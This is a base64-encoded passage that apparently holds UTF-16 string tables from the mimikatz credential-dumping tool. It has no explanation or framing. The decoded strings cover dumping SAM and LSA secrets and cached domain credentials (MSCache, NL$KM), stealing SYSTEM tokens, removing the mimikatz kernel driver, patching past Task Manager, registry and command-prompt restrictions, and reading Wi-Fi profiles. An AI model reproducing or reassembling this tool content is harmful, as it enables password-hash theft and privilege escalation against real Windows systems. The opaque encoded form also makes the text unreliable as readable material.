AAZAByAGkAdgBlAHIAIABuAG8AdAAgAHIAdQBuAG4AaQBuAGcACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAHIAZQBtAG8AdgBlAF8AbQBpAG0AaQBkAHIAdgAgADsAIABrAHUAbABsAF8AbQBfAHMAZQByAHYAaQBjAGUAXwBzAHQAbwBwACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIAByAGUAbQBvAHYAZQBkAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwByAGUAbQBvAHYAZQBfAG0AaQBtAGkAZAByAHYAIAA7ACAAawB1AGwAbABfAG0AXwBzAGUAcgB2AGkAYwBlAF8AcgBlAG0AbwB2AGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAFAAcgBvAGMAZQBzAHMAIAA6ACAAJQBzAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAHAAcgBvAGMAZQBzAHMAUAByAG8AdABlAGMAdAAgADsAIABrAHUAbABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAdABQAHIAbwBjAGUAcwBzAEkAZABGAG8AcgBOAGEAbQBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAcABpAGQAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AcAByAG8AYwBlAHMAcwBQAHIAbwB0AGUAYwB0ACAAOwAgAEEAcgBnAHUAbQBlAG4AdAAgAC8AcAByAG8AYwBlAHMAcwA6AHAAcgBvAGcAcgBhAG0ALgBlAHgAZQAgAG8AcgAgAC8AcABpAGQAOgBwAHIAbwBjAGUAcwBzAGkAZAAgAG4AZQBlAGQAZQBkAAoAAAAAAAAAAABQAEkARAAgACUAdQAgAC0APgAgACUAMAAyAHgALwAlADAAMgB4ACAAWwAlADEAeAAtACUAMQB4AC0AJQAxAHgAXQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBwAHIAbwBjAGUAcwBzAFAAcgBvAHQAZQBjAHQAIAA7ACAATgBvACAAUABJAEQACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBwAHIAbwBjAGUAcwBzAFAAcgBvAHQAZQBjAHQAIAA7ACAAUAByAG8AdABlAGMAdABlAGQAIABwAHIAbwBjAGUAcwBzACAAbgBvAHQAIABhAHYAYQBpAGwAYQBiAGwAZQAgAGIAZQBmAG8AcgBlACAAVwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQAKAAAAAABmAHIAbwBtAAAAAAB0AG8AAAAAAAAAAABUAG8AawBlAG4AIABmAHIAbwBtACAAcAByAG8AYwBlAHMAcwAgACUAdQAgAHQAbwAgAHAAcgBvAGMAZQBzAHMAIAAlAHUACgAAAAAAAAAAACAAKgAgAGYAcgBvAG0AIAAwACAAdwBpAGwAbAAgAHQAYQBrAGUAIABTAFkAUwBUAEUATQAgAHQAbwBrAGUAbgAKAAAAAAAAAAAAAAAAAAAAIAAqACAAdABvACAAMAAgAHcAaQBsAGwAIAB0AGEAawBlACAAYQBsAGwAIAAnAGMAbQBkACcAIABhAG4AZAAgACcAbQBpAG0AaQBrAGEAdAB6ACcAIABwAHIAbwBjAGUAcwBzAAoAAABEAGEAdABhAAAAAAAAAAAARwBCAEcAAABTAGsAZQB3ADEAAABKAEQAAAAAAAAAAABEAGUAZgBhAHUAbAB0AAAAQwB1AHIAcgBlAG4AdAAAAAAAAAAAAAAAQQBzAGsAIABTAEEATQAgAFMAZQByAHYAaQBjAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABTAEEATQAgAGUAbgB0AHIAaQBlAHMAIAAoAHAAYQB0AGMAaAAgAG8AbgAgAHQAaABlACAAZgBsAHkAKQAAAAAAcwBhAG0AcgBwAGMAAAAAAAAAAAAAAAAARwBlAHQAIAB0AGgAZQAgAFMAeQBzAEsAZQB5ACAAdABvACAAZABlAGMAcgB5AHAAdAAgAE4ATAAkAEsATQAgAHQAaABlAG4AIABNAFMAQwBhAGMAaABlACgAdgAyACkAIAAoAGYAcgBvAG0AIAByAGUAZwBpAHMAdAByAHkAIABvAHIAIABoAGkAdgBlAHMAKQAAAAAAAABjAGEAYwBoAGUAAAAAAAAAAAAAAAAAAABHAGUAdAAgAHQAaABlACAAUwB5AHMASwBlAHkAIAB0AG8AIABkAGUAYwByAHkAcAB0ACAAUwBFAEMAUgBFAFQAUwAgAGUAbgB0AHIAaQBlAHMAIAAoAGYAcgBvAG0AIAByAGUAZwBpAHMAdAByAHkAIABvAHIAIABoAGkAdgBlAHMAKQAAAAAAcwBlAGMAcgBlAHQAcwAAAAAAAAAAAAAARwBlAHQAIAB0AGgAZQAgAFMAeQBzAEsAZQB5ACAAdABvACAAZABlAGMAcgB5AHAAdAAgAFMAQQBNACAAZQBuAHQAcgBpAGUAcwAgACgAZgByAG8AbQAgAHIAZQBnAGkAcwB0AHIAeQAgAG8AcgAgAGgAaQB2AGUAcwApAAAAAABzAGEAbQAAAEwAcwBhAEQAdQBtAHAAIABtAG8AZAB1AGwAZQAAAAAAbABzAGEAZAB1AG0AcAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBhAG0AIAA7ACAAQwByAGUAYQB0AGUARgBpAGwAZQAgACgAUwBZAFMAVABFAE0AIABoAGkAdgBlACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKABTAEEATQAgAGgAaQB2AGUAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABTAFkAUwBUAEUATQAAAAAAUwBBAE0AAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAE8AcABlAG4ASwBlAHkARQB4ACAAKABTAEEATQApACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGUAYwByAGUAdABzAE8AcgBDAGEAYwBoAGUAIAA7ACAAQwByAGUAYQB0AGUARgBpAGwAZQAgACgAUwBFAEMAVQBSAEkAVABZACAAaABpAHYAZQApACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBlAGMAcgBlAHQAcwBPAHIAQwBhAGMAaABlACAAOwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoAFMAWQBTAFQARQBNACAAaABpAHYAZQApACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABTAEUAQwBVAFIASQBUAFkAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGUAYwByAGUAdABzAE8AcgBDAGEAYwBoAGUAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgACgAUwBFAEMAVQBSAEkAVABZACkAIAAoADAAeAAlADAAOAB4ACkACgAAAEMAbwBuAHQAcgBvAGwAUwBlAHQAMAAwADAAAAAAAAAAUwBlAGwAZQBjAHQAAAAAACUAMAAzAHUAAAAAACUAeAAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAUwB5AHMAawBlAHkAIAA7ACAATABTAEEAIABLAGUAeQAgAEMAbABhAHMAcwAgAHIAZQBhAGQAIABlAHIAcgBvAHIACgAAAAAARABvAG0AYQBpAG4AIAA6ACAAAAAAAAAAQwBvAG4AdAByAG8AbABcAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAFwAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAAAAAAAAAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AEMAbwBtAHAAdQB0AGUAcgBBAG4AZABTAHkAcwBrAGUAeQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABLAE8ACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AEMAbwBtAHAAdQB0AGUAcgBBAG4AZABTAHkAcwBrAGUAeQAgADsAIABwAHIAZQAgAC0AIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABLAE8ACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABDAG8AbQBwAHUAdABlAHIAQQBuAGQAUwB5AHMAawBlAHkAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAASwBPAAoAAAAAAAAAUwB5AHMASwBlAHkAIAA6ACAAAAAAAAAAQwBvAG4AdAByAG8AbABcAEwAUwBBAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABDAG8AbQBwAHUAdABlAHIAQQBuAGQAUwB5AHMAawBlAHkAIAA7ACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAUwB5AHMAawBlAHkAIABLAE8ACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAQwBvAG0AcAB1AHQAZQByAEEAbgBkAFMAeQBzAGsAZQB5ACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcATwBwAGUAbgBLAGUAeQBFAHgAIABMAFMAQQAgAEsATwAKAAAAAAAAAAAAUwBBAE0AXABEAG8AbQBhAGkAbgBzAFwAQQBjAGMAbwB1AG4AdAAAAFUAcwBlAHIAcwAAAAAAAABOAGEAbQBlAHMAAAAAAAAACgBSAEkARAAgACAAOgAgACUAMAA4AHgAIAAoACUAdQApAAoAAAAAAFYAAAAAAAAAVQBzAGUAcgAgADoAIAAlAC4AKgBzAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABVAHMAZQByAHMAQQBuAGQAUwBhAG0ASwBlAHkAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgAFYAIABLAE8ACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAVQBzAGUAcgBzAEEAbgBkAFMAYQBtAEsAZQB5ACAAOwAgAHAAcgBlACAALQAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIABWACAASwBPAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABVAHMAZQByAHMAQQBuAGQAUwBhAG0ASwBlAHkAIAA7ACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQASwBlACAASwBPAAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABVAHMAZQByAHMAQQBuAGQAUwBhAG0ASwBlAHkAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgAFMAQQBNACAAQQBjAGMAbwB1AG4AdABzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABOAFQATABNAAAAAAAAAAAATABNACAAIAAAAAAAAAAAACUAcwAgADoAIAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABIAGEAcwBoACAAOwAgAFIAdABsAEQAZQBjAHIAeQBwAHQARABFAFMAMgBiAGwAbwBjAGsAcwAxAEQAVwBPAFIARAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AEgAYQBzAGgAIAA7ACAAUgB0AGwARQBuAGMAcgB5AHAAdABEAGUAYwByAHkAcAB0AEEAUgBDADQAAAAAAAAAAAAKAFMAQQBNAEsAZQB5ACAAOgAgAAAAAABGAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFMAYQBtAEsAZQB5ACAAOwAgAFIAdABsAEUAbgBjAHIAeQBwAHQARABlAGMAcgB5AHAAdABBAFIAQwA0ACAASwBPAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAUwBhAG0ASwBlAHkAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgAEYAIABLAE8AAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAUwBhAG0ASwBlAHkAIAA7ACAAcAByAGUAIAAtACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgAEYAIABLAE8AAABQAG8AbABpAGMAeQAAAAAAUABvAGwAUgBlAHYAaQBzAGkAbwBuAAAACgBQAG8AbABpAGMAeQAgAHMAdQBiAHMAeQBzAHQAZQBtACAAaQBzACAAOgAgACUAaAB1AC4AJQBoAHUACgAAAFAAbwBsAEUASwBMAGkAcwB0AAAAAAAAAFAAbwBsAFMAZQBjAHIAZQB0AEUAbgBjAHIAeQBwAHQAaQBvAG4ASwBlAHkAAAAAAEwAUwBBACAASwBlAHkAKABzACkAIAA6ACAAJQB1ACwAIABkAGUAZgBhAHUAbAB0ACAAAAAAAAAAIAAgAFsAJQAwADIAdQBdACAAAAAgAAAATABTAEEAIABLAGUAeQAgADoAIAAAAAAAUwBlAGMAcgBlAHQAcwAAAHMAZQByAHYAaQBjAGUAcwAAAAAAAAAAAAoAUwBlAGMAcgBlAHQAIAAgADoAIAAlAHMAAAAAAAAAXwBTAEMAXwAAAAAAAAAAAEMAdQByAHIAVgBhAGwAAAAkAE0AQQBDAEgASQBOAEUALgBBAEMAQwAAAAAAAAAAAAoAKgAqAE4AVABMAE0AKgAqADoAIAAAAAoAYwB1AHIALwAAAAAAAABPAGwAZABWAGEAbAAAAAAACgBvAGwAZAAvAAAAAAAAAFMAZQBjAHIAZQB0AHMAXABOAEwAJABLAE0AXABDAHUAcgByAFYAYQBsAAAAAAAAAEMAYQBjAGgAZQAAAAAAAABOAEwAJABJAHQAZQByAGEAdABpAG8AbgBDAG8AdQBuAHQAAAAAAAAAAAAAAAAAAAAqACAATgBMACQASQB0AGUAcgBhAHQAaQBvAG4AQwBvAHUAbgB0ACAAaQBzACAAJQB1ACwAIAAlAHUAIAByAGUAYQBsACAAaQB0AGUAcgBhAHQAaQBvAG4AKABzACkACgAAAAAAAAAAACoAIABEAEMAQwAxACAAbQBvAGQAZQAgACEACgAAAAAAAAAAAAAAAAAqACAASQB0AGUAcgBhAHQAaQBvAG4AIABpAHMAIABzAGUAdAAgAHQAbwAgAGQAZQBmAGEAdQBsAHQAIAAoADEAMAAyADQAMAApAAoAAAAAAE4ATAAkAEMAbwBuAHQAcgBvAGwAAAAAAAoAWwAlAHMAIAAtACAAAABdAAoAUgBJAEQAIAAgACAAIAAgACAAIAA6ACAAJQAwADgAeAAgACgAJQB1ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AE4ATABLAE0AUwBlAGMAcgBlAHQAQQBuAGQAQwBhAGMAaABlACAAOwAgAEMAcgB5AHAAdABEAGUAYwByAHkAcAB0ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AE4ATABLAE0AUwBlAGMAcgBlAHQAQQBuAGQAQwBhAGMAaABlACAAOwAgAEMAcgB5AHAAdABTAGUAdABLAGUAeQBQAGEAcgBhAG0AIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AE4ATABLAE0AUwBlAGMAcgBlAHQAQQBuAGQAQwBhAGMAaABlACAAOwAgAEMAcgB5AHAAdABJAG0AcABvAHIAdABLAGUAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AE4ATABLAE0AUwBlAGMAcgBlAHQAQQBuAGQAQwBhAGMAaABlACAAOwAgAFIAdABsAEUAbgBjAHIAeQBwAHQARABlAGMAcgB5AHAAdABSAEMANAAgADoAIAAwAHgAJQAwADgAeAAKAAAAVQBzAGUAcgAgACAAIAAgACAAIAA6ACAAJQAuACoAcwBcACUALgAqAHMACgAAAAAATQBzAEMAYQBjAGgAZQBWACUAYwAgADoAIAAAAAAAAABPAGIAagBlAGMAdABOAGEAbQBlAAAAAAAgAC8AIABzAGUAcgB2AGkAYwBlACAAJwAlAHMAJwAgAHcAaQB0AGgAIAB1AHMAZQByAG4AYQBtAGUAIAA6ACAAJQBzAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGQAZQBjAHIAeQBwAHQAUwBlAGMAcgBlAHQAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgAFMAZQBjAHIAZQB0ACAAdgBhAGwAdQBlACAASwBPAAoAAAAAAAAAdABlAHgAdAA6ACAAJQB3AFoAAAAAAAAAaABlAHgAIAA6ACAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBlAGMAXwBhAGUAcwAyADUANgAgADsAIABDAHIAeQBwAHQARABlAGMAcgB5AHAAdAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGUAYwBfAGEAZQBzADIANQA2ACAAOwAgAEMAcgB5AHAAdABJAG0AcABvAHIAdABLAGUAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABwAGEAdABjAGgAAAAAAAAAUwBhAG0AUwBzAAAAAAAAAHMAYQBtAHMAcgB2AC4AZABsAGwAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAYQBtAHIAcABjACAAOwAgAGsAdQBsAGwAXwBtAF8AcABhAHQAYwBoACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQByAHAAYwAgADsAIABrAHUAbABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAdABWAGUAcgB5AEIAYQBzAGkAYwBNAG8AZAB1AGwAZQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AcwBGAG8AcgBOAGEAbQBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQByAHAAYwAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBhAG0AcgBwAGMAIAA7ACAAawB1AGwAbABfAG0AXwBzAGUAcgB2AGkAYwBlAF8AZwBlAHQAVQBuAGkAcQB1AGUARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAARABvAG0AYQBpAG4AIAA6ACAAJQB3AFoAIAAvACAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQByAHAAYwAgADsAIABTAGEAbQBMAG8AbwBrAHUAcABJAGQAcwBJAG4ARABvAG0AYQBpAG4AIAAlADAAOAB4AAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAYQBtAHIAcABjACAAOwAgACcAJQBzACcAIABpAHMAIABuAG8AdAAgAGEAIAB2AGEAbABpAGQAIABJAGQACgAAAAAAAABuAGEAbQBlAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBhAG0AcgBwAGMAIAA7ACAAUwBhAG0ATABvAG8AawB1AHAATgBhAG0AZQBzAEkAbgBEAG8AbQBhAGkAbgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQByAHAAYwAgADsAIABTAGEAbQBFAG4AdQBtAGUAcgBhAHQAZQBVAHMAZQByAHMASQBuAEQAbwBtAGEAaQBuACAAJQAwADgAeAAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAYQBtAHIAcABjACAAOwAgAFMAYQBtAE8AcABlAG4ARABvAG0AYQBpAG4AIAAlADAAOAB4AAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQByAHAAYwAgADsAIABTAGEAbQBDAG8AbgBuAGUAYwB0ACAAJQAwADgAeAAKAAAAAAAKAFIASQBEACAAIAA6ACAAJQAwADgAeAAgACgAJQB1ACkACgBVAHMAZQByACAAOgAgACUAdwBaAAoAAAAAAAAATABNACAAIAAgADoAIAAAAAoATgBUAEwATQAgADoAIAAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBhAG0AcgBwAGMAXwB1AHMAZQByACAAOwAgAFMAYQBtAFEAdQBlAHIAeQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AVQBzAGUAcgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBhAG0AcgBwAGMAXwB1AHMAZQByACAAOwAgAFMAYQBtAE8AcABlAG4AVQBzAGUAcgAgACUAMAA4AHgACgAAAAAAAAAAAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG4AZwAAAAAAZABpAHMAYwBvAHYAZQByAGkAbgBnAAAAYQBzAHMAbwBjAGkAYQB0AGkAbgBnAAAAZABpAHMAYwBvAG4AbgBlAGMAdABlAGQAAAAAAAAAAABkAGkAcwBjAG8AbgBuAGUAYwB0AGkAbgBnAAAAAAAAAGEAZABfAGgAbwBjAF8AbgBlAHQAdwBvAHIAawBfAGYAbwByAG0AZQBkAAAAAAAAAGMAbwBuAG4AZQBjAHQAZQBkAAAAAAAAAG4AbwB0AF8AcgBlAGEAZAB5AAAAAAAAAHcAaQBmAGkAAAAAAAAAAABbAGUAeABwAGUAcgBpAG0AZQBuAHQAYQBsAF0AIABUAHIAeQAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlACAAYQBsAGwAIABtAG8AZAB1AGwAZQBzACAAdwBpAHQAaAAgAEQAZQB0AG8AdQByAHMALQBsAGkAawBlACAAaABvAG8AawBzAAAAZABlAHQAbwB1AHIAcwAAAAAAAAAAAAAASgB1AG4AaQBwAGUAcgAgAE4AZQB0AHcAbwByAGsAIABDAG8AbgBuAGUAYwB0ACAAKAB3AGkAdABoAG8AdQB0ACAAcgBvAHUAdABlACAAbQBvAG4AaQB0AG8AcgBpAG4AZwApAAAAAABuAGMAcgBvAHUAdABlAG0AbwBuAAAAAABUAGEAcwBrACAATQBhAG4AYQBnAGUAcgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAoAHcAaQB0AGgAbwB1AHQAIABEAGkAcwBhAGIAbABlAFQAYQBzAGsATQBnAHIAKQAAAAAAAAAAAHQAYQBzAGsAbQBnAHIAAAAAAAAAAAAAAFIAZQBnAGkAcwB0AHIAeQAgAEUAZABpAHQAbwByACAAIAAgACAAIAAgACAAIAAgACgAdwBpAHQAaABvAHUAdAAgAEQAaQBzAGEAYgBsAGUAUgBlAGcAaQBzAHQAcgB5AFQAbwBvAGwAcwApAAAAAAByAGUAZwBlAGQAaQB0AAAAQwBvAG0AbQBhAG4AZAAgAFAAcgBvAG0AcAB0ACAAIAAgACAAIAAgACAAIAAgACAAKAB3AGkAdABoAG8AdQB0ACAARABpAHMAYQBiAGwAZQBDAE0ARAApAAAAAAAAAAAAYwBtAGQAAABNAGkAcwBjAGUAbABsAGEAbgBlAG8AdQBzACAAbQBvAGQAdQBsAGUAAAAAAAAAAABtAGkAcwBjAAAAAAAAAAAAdwBsAGEAbgBhAHAAaQAAAFdsYW5PcGVuSGFuZGxlAABXbGFuQ2xvc2VIYW5kbGUAV2xhbkVudW1JbnRlcmZhY2VzAAAAAAAAV2xhbkdldFByb2ZpbGVMaXN0AAAAAAAAV2xhbkdldFByb2ZpbGUAAFdsYW5GcmVlTWVtb3J5AABLAGkAdwBpAEEAbgBkAEMATQBEAAAAAABEAGkAcwBhAGIAbABlAEMATQBEAAAAAABjAG0AZAAuAGUAeABlAAAASwBpAHcAaQBBAG4AZABSAGUAZwBpAHMAdAByAHkAVABvAG8AbABzAAAAAAAAAAAARABpAHMAYQBiAGwAZQBSAGUAZwBpAHMAdAByAHkAVABvAG8AbABzAAAAAAAAAAAAcgBlAGcAZQBkAGkAdAAuAGUAeABlAAAASwBpAHcAaQBBAG4AZABUAGEAcwBrAE0AZwByAAAAAABEAGkAcwBhAGIAbABlAFQAYQBzAGsATQBnAHIAAAAAAHQAYQBzAGsAbQBnAHIALgBlAHgAZQAAAGQAcwBOAGMAUwBlAHIAdgBpAGMAZQAAAAkAKAAlAHcAWgApAAAAAAAJAFsAJQB1AF0AIAAlAHcAWgAgACEAIAAAAAAAAAAAACUALQAzADIAUwAAAAAAAAAjACAAJQB1AAAAAAAAAAAACQAgACUAcAAgAC0APgAgACUAcAAAAAAAJQB3AFoAIAAoACUAdQApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAcwBjAF8AZABlAHQAbwB1AHIAcwBfAGMAYQBsAGwAYgBhAGMAawBfAHAAcgBvAGMAZQBzAHMAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAUABhAHQAYwBoACAATwBLACAAZgBvAHIAIAAnACUAcwAnACAAZgByAG8AbQAgACcAJQBzACcAIAB0AG8AIAAnACUAcwAnACAAQAAgACUAcAAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAcwBjAF8AZwBlAG4AZQByAGkAYwBfAG4AbwBnAHAAbwBfAHAAYQB0AGMAaAAgADsAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAgACoAIAAAACAALwAgACUAcwAgAC0AIAAlAHMACgAAAAkAfAAgACUAcwAKAAAAAABnAHIAbwB1AHAAAAAAAAAAbABvAGMAYQBsAGcAcgBvAHUAcAAAAAA